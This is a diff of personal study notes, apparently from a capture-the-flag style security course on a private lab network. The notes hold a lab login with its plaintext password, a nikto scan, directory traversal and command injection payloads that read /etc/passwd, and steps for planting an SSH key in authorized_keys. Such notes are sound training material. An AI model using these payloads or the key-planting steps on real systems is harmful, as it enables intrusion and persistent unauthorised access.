@@ -3,6 +3,8 @@ MIDY-003-M
 USERINFO::http://10.50.21.3/classinfo.html
 CTFd::http://10.50.20.250:8000
 
+xfreerdp /v:10.50.29.185 /u:student +clipboard +dynamic-resolution +glyph-cache
+
 Stack: 1 	
 Username: MIDY-003-M 	
 Password: 98DjctjRf4TQpHB ---- password
@@ -41,14 +43,50 @@ PORT ENUMERATION:
 PORT INTERIGATION:  
     proxychains nc 192.168.28.111 80
 
+# Web Expliotation (XSS)
+**Requests**
+GET
+POST
+HEAD
+PUT
 
+**HTTP Response Codes**
+10X == Informational
+2XX == Success
+30X == Redirection
+4XX == Client Error
+5XX == Server Error
 
+https://user-agents.net/lookup
 
+Check for Robots.txt
 
+sudo apt install nikto -y
 
+nikto -h 10.50.40.14
 
+**Attack Methods**
+//Cookie script
 
+//Directory Traversal(GET) -- myfile=../../../../etc/passwd
+//Directory Traversal(POST) -- File to read [../../../../etc/passwd]
 
+//Malicious File Upload
+Bad.php -- on lin-ops
+
+//Command Injection
+;whoami
+;cat /etc/passwd
+;ls -latr & netstat -rn
+|| ifconfig
+
+//SSH Key Upload
+ssh -keygen -t rsa
+cat ~/.ssh/id_rsa.pub  --copy this
+ls -la /users/home/directory      --check if .ssh exists
+mkdir /users/home/directory/.ssh   --make .ssh in users home folder if it does not exist
+echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys  -- puts ssh key in dir
+ cat /users/home/directory/.ssh/authorized_keys  -- verify
 
 
 
